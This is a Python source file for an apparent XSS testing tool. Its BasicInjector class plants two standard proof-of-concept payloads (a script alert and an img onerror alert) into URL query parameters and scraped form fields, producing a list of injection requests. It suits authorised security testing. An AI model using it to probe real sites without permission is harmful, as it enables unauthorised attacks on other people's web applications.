from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests
from bs4 import BeautifulSoup

DEFAULT_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>"
]

class BasicInjector:
    def __init__(self, payloads=None, timeout=5):
        self.payloads = payloads or DEFAULT_PAYLOADS
        self.timeout = timeout

    def inject(self, url: str):
        injections = []

        # ---- GET parameter injection ----
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param in params:
            for payload in self.payloads:
                new_params = params.copy()
                new_params[param] = payload

                new_query = urlencode(new_params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))

                injections.append({
                    "url": new_url,
                    "method": "GET",
                    "parameter": param,
                    "payload": payload
                })

        # ---- FORM injection ----
        try:
            r = requests.get(url, timeout=self.timeout)
            if "text/html" not in r.headers.get("Content-Type", ""):
                return injections
        except requests.RequestException:
            return injections

        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            action = form.get("action") or url
            method = form.get("method", "get").upper()

            inputs = form.find_all("input")
            fields = [i.get("name") for i in inputs if i.get("name")]

            for field in fields:
                for payload in self.payloads:
                    data = {f: "test" for f in fields}
                    data[field] = payload

                    injections.append({
                        "url": action,
                        "method": method,
                        "parameter": field,
                        "payload": payload,
                        "data": data
                    })

        return injections
